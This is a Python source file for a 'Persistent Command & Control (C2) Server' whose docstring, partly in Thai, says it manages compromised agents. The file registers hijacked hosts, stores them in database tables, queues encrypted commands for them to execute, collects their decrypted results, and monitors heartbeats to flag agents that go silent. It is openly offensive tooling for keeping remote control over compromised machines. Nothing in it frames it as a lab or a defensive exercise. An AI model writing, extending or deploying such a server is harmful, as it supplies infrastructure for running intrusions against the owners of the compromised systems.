"""
Persistent Command & Control (C2) Server
จัดการ compromised agents และส่งคำสั่งแบบ persistent
"""

import asyncio
import uuid
import base64
import json
from typing import Dict, List, Optional
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from core.logger import log


class C2Server:
    """
    Persistent Command & Control Server
    
    Features:
    - Agent registration and management
    - Encrypted command/response communication
    - Task queue system
    - Multi-protocol support
    - Heartbeat monitoring
    """
    
    def __init__(self, db):
        """
        Initialize C2 Server
        
        Args:
            db: Database connection
        """
        self.db = db
        self.agents = {}  # agent_id -> agent_info (in-memory cache)
        self.tasks = {}   # task_id -> task_info (in-memory cache)
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
        # Protocol handlers
        self.protocols = {}
        
        log.info("[C2Server] Initialized")
    
    async def initialize(self):
        """Initialize C2 server and create database tables"""
        try:
            # Create agents table
            await self.db.execute("""
                CREATE TABLE IF NOT EXISTS c2_agents (
                    agent_id VARCHAR(255) PRIMARY KEY,
                    hostname VARCHAR(255),
                    ip_address VARCHAR(255),
                    os_info TEXT,
                    protocol VARCHAR(50),
                    status VARCHAR(50),
                    registered_at TIMESTAMP,
                    last_seen TIMESTAMP,
                    metadata JSONB
                )
            """)
            
            # Create tasks table
            await self.db.execute("""
                CREATE TABLE IF NOT EXISTS c2_tasks (
                    task_id VARCHAR(255) PRIMARY KEY,
                    agent_id VARCHAR(255),
                    command TEXT,
                    encrypted_command TEXT,
                    status VARCHAR(50),
                    result TEXT,
                    created_at TIMESTAMP,
                    completed_at TIMESTAMP,
                    FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id)
                )
            """)
            
            # Create heartbeats table
            await self.db.execute("""
                CREATE TABLE IF NOT EXISTS c2_heartbeats (
                    id SERIAL PRIMARY KEY,
                    agent_id VARCHAR(255),
                    timestamp TIMESTAMP,
                    data JSONB,
                    FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id)
                )
            """)
            
            log.success("[C2Server] Database tables initialized")
            
        except Exception as e:
            log.error(f"[C2Server] Database initialization failed: {e}")
            raise
    
    async def register_agent(self, agent_info: Dict) -> str:
        """
        Register new compromised agent
        
        Args:
            agent_info: {
                "hostname": str,
                "ip_address": str,
                "os_info": str,
                "protocol": str,
                "metadata": dict
            }
        
        Returns:
            agent_id
        """
        try:
            agent_id = self._generate_agent_id()
            
            # Store in memory
            self.agents[agent_id] = {
                **agent_info,
                "agent_id": agent_id,
                "registered_at": datetime.now(),
                "last_seen": datetime.now(),
                "status": "active"
            }
            
            # Store in database
            await self.db.execute("""
                INSERT INTO c2_agents 
                (agent_id, hostname, ip_address, os_info, protocol, status, registered_at, last_seen, metadata)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
            """,
                agent_id,
                agent_info.get("hostname"),
                agent_info.get("ip_address"),
                agent_info.get("os_info"),
                agent_info.get("protocol", "http"),
                "active",
                datetime.now(),
                datetime.now(),
                json.dumps(agent_info.get("metadata", {}))
            )
            
            log.success(f"[C2Server] Agent registered: {agent_id} ({agent_info.get('hostname')})")
            
            return agent_id
            
        except Exception as e:
            log.error(f"[C2Server] Agent registration failed: {e}")
            raise
    
    async def send_command(self, agent_id: str, command: str, timeout: int = 300) -> str:
        """
        Send command to agent
        
        Args:
            agent_id: Target agent ID
            command: Command to execute
            timeout: Command timeout in seconds
        
        Returns:
            task_id
        """
        try:
            # Check if agent exists and is active
            agent = await self.get_agent(agent_id)
            if not agent:
                raise ValueError(f"Agent {agent_id} not found")
            
            if agent["status"] != "active":
                raise ValueError(f"Agent {agent_id} is not active (status: {agent['status']})")
            
            # Generate task ID
            task_id = self._generate_task_id()
            
            # Encrypt command
            encrypted_command = self.cipher.encrypt(command.encode())
            
            # Store task
            self.tasks[task_id] = {
                "task_id": task_id,
                "agent_id": agent_id,
                "command": command,
                "encrypted_command": encrypted_command.decode(),
                "status": "pending",
                "created_at": datetime.now(),
                "timeout": timeout
            }
            
            # Store in database
            await self.db.execute("""
                INSERT INTO c2_tasks 
                (task_id, agent_id, command, encrypted_command, status, created_at)
                VALUES ($1, $2, $3, $4, $5, $6)
            """,
                task_id,
                agent_id,
                command,
                encrypted_command.decode(),
                "pending",
                datetime.now()
            )
            
            log.info(f"[C2Server] Command queued for agent {agent_id}: {command[:50]}...")
            
            return task_id
            
        except Exception as e:
            log.error(f"[C2Server] Send command failed: {e}")
            raise
    
    async def get_pending_tasks(self, agent_id: str) -> List[Dict]:
        """
        Get pending tasks for agent
        
        Args:
            agent_id: Agent ID
        
        Returns:
            List of pending tasks
        """
        try:
            rows = await self.db.fetch("""
                SELECT task_id, encrypted_command, created_at
                FROM c2_tasks
                WHERE agent_id = $1 AND status = 'pending'
                ORDER BY created_at ASC
            """, agent_id)
            
            tasks = []
            for row in rows:
                tasks.append({
                    "task_id": row["task_id"],
                    "encrypted_command": row["encrypted_command"],
                    "created_at": row["created_at"].isoformat()
                })
            
            return tasks
            
        except Exception as e:
            log.error(f"[C2Server] Get pending tasks failed: {e}")
            return []
    
    async def receive_result(self, agent_id: str, task_id: str, encrypted_result: str):
        """
        Receive result from agent
        
        Args:
            agent_id: Agent ID
            task_id: Task ID
            encrypted_result: Encrypted result data
        """
        try:
            # Decrypt result
            result = self.cipher.decrypt(encrypted_result.encode()).decode()
            
            # Update task in memory
            if task_id in self.tasks:
                self.tasks[task_id]["status"] = "completed"
                self.tasks[task_id]["result"] = result
                self.tasks[task_id]["completed_at"] = datetime.now()
            
            # Update in database
            await self.db.execute("""
                UPDATE c2_tasks
                SET status = $1, result = $2, completed_at = $3
                WHERE task_id = $4
            """,
                "completed",
                result,
                datetime.now(),
                task_id
            )
            
            # Update agent last seen
            await self.update_agent_heartbeat(agent_id)
            
            log.success(f"[C2Server] Received result for task {task_id} from agent {agent_id}")
            
        except Exception as e:
            log.error(f"[C2Server] Receive result failed: {e}")
            raise
    
    async def update_agent_heartbeat(self, agent_id: str, data: Dict = None):
        """
        Update agent heartbeat
        
        Args:
            agent_id: Agent ID
            data: Optional heartbeat data
        """
        try:
            # Update last seen
            if agent_id in self.agents:
                self.agents[agent_id]["last_seen"] = datetime.now()
            
            await self.db.execute("""
                UPDATE c2_agents
                SET last_seen = $1
                WHERE agent_id = $2
            """, datetime.now(), agent_id)
            
            # Store heartbeat
            await self.db.execute("""
                INSERT INTO c2_heartbeats (agent_id, timestamp, data)
                VALUES ($1, $2, $3)
            """,
                agent_id,
                datetime.now(),
                json.dumps(data or {})
            )
            
        except Exception as e:
            log.error(f"[C2Server] Update heartbeat failed: {e}")
    
    async def get_agent(self, agent_id: str) -> Optional[Dict]:
        """
        Get agent information
        
        Args:
            agent_id: Agent ID
        
        Returns:
            Agent info dict or None
        """
        try:
            # Check memory cache first
            if agent_id in self.agents:
                return self.agents[agent_id]
            
            # Query database
            row = await self.db.fetchrow("""
                SELECT * FROM c2_agents WHERE agent_id = $1
            """, agent_id)
            
            if row:
                agent_info = dict(row)
                agent_info["metadata"] = json.loads(agent_info.get("metadata", "{}"))
                self.agents[agent_id] = agent_info
                return agent_info
            
            return None
            
        except Exception as e:
            log.error(f"[C2Server] Get agent failed: {e}")
            return None
    
    async def list_agents(self, status: str = None) -> List[Dict]:
        """
        List all agents
        
        Args:
            status: Filter by status (optional)
        
        Returns:
            List of agents
        """
        try:
            if status:
                rows = await self.db.fetch("""
                    SELECT * FROM c2_agents WHERE status = $1
                    ORDER BY last_seen DESC
                """, status)
            else:
                rows = await self.db.fetch("""
                    SELECT * FROM c2_agents
                    ORDER BY last_seen DESC
                """)
            
            agents = []
            for row in rows:
                agent_info = dict(row)
                agent_info["metadata"] = json.loads(agent_info.get("metadata", "{}"))
                agents.append(agent_info)
            
            return agents
            
        except Exception as e:
            log.error(f"[C2Server] List agents failed: {e}")
            return []
    
    async def deactivate_agent(self, agent_id: str):
        """
        Deactivate agent
        
        Args:
            agent_id: Agent ID
        """
        try:
            if agent_id in self.agents:
                self.agents[agent_id]["status"] = "inactive"
            
            await self.db.execute("""
                UPDATE c2_agents
                SET status = $1
                WHERE agent_id = $2
            """, "inactive", agent_id)
            
            log.info(f"[C2Server] Agent {agent_id} deactivated")
            
        except Exception as e:
            log.error(f"[C2Server] Deactivate agent failed: {e}")
    
    async def cleanup_stale_agents(self, timeout_minutes: int = 30):
        """
        Mark agents as stale if no heartbeat received
        
        Args:
            timeout_minutes: Timeout in minutes
        """
        try:
            cutoff_time = datetime.now() - timedelta(minutes=timeout_minutes)
            
            await self.db.execute("""
                UPDATE c2_agents
                SET status = 'stale'
                WHERE last_seen < $1 AND status = 'active'
            """, cutoff_time)
            
            # Update memory cache
            for agent_id, agent_info in self.agents.items():
                if agent_info.get("last_seen") < cutoff_time and agent_info.get("status") == "active":
                    agent_info["status"] = "stale"
            
            log.info(f"[C2Server] Cleaned up stale agents (timeout: {timeout_minutes}m)")
            
        except Exception as e:
            log.error(f"[C2Server] Cleanup stale agents failed: {e}")
    
    async def get_task_status(self, task_id: str) -> Optional[Dict]:
        """
        Get task status
        
        Args:
            task_id: Task ID
        
        Returns:
            Task info dict or None
        """
        try:
            # Check memory cache
            if task_id in self.tasks:
                return self.tasks[task_id]
            
            # Query database
            row = await self.db.fetchrow("""
                SELECT * FROM c2_tasks WHERE task_id = $1
            """, task_id)
            
            if row:
                return dict(row)
            
            return None
            
        except Exception as e:
            log.error(f"[C2Server] Get task status failed: {e}")
            return None
    
    def _generate_agent_id(self) -> str:
        """Generate unique agent ID"""
        return f"agent_{uuid.uuid4().hex[:16]}"
    
    def _generate_task_id(self) -> str:
        """Generate unique task ID"""
        return f"task_{uuid.uuid4().hex[:16]}"
    
    def get_encryption_key(self) -> bytes:
        """Get encryption key for agents"""
        return self.encryption_key

